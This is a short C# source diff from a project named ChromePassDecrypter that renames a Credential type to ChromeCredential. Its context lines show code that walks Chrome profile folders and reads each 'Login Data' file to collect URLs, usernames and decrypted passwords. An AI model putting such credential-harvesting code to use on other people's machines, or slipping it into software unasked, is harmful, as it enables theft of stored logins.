@@ -41,7 +41,7 @@ namespace ChromePassDecrypter
 	{
 		private static string pathToProfiles = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data";
 		
-		public static Credential[] GetPasswords()
+		public static ChromeCredential[] GetPasswords()
 		{
 			ArrayList result = new ArrayList();
 			DirectoryInfo dirInfo = new DirectoryInfo(pathToProfiles);
@@ -63,10 +63,10 @@ namespace ChromePassDecrypter
 				result.AddRange(GetPasswords(subDirInfo[i].FullName + @"\Login Data"));
 			}
 			
-			return (Credential[])result.ToArray();
+			return (ChromeCredential[])result.ToArray();
 		}
 		
-		private static Credential[] GetPasswords(string pathToPasswordsFile)
+		private static ChromeCredential[] GetPasswords(string pathToPasswordsFile)
 		{
 			if (!File.Exists(pathToPasswordsFile))
 			{
@@ -102,7 +102,7 @@ namespace ChromePassDecrypter
 							{
 								password = "Password could not be retrieved: " + ex.Message;
 							}
-							result.Add(new Credential(originUrl, username, password));
+							result.Add(new ChromeCredential(originUrl, username, password));
 						}
 					}
 				}
@@ -118,7 +118,7 @@ namespace ChromePassDecrypter
 				// Some tweaking tools will clean this folder at some point..
 			}
 			
-			return (Credential[])result.ToArray();
+			return (ChromeCredential[])result.ToArray();
 		}
 	}
 }
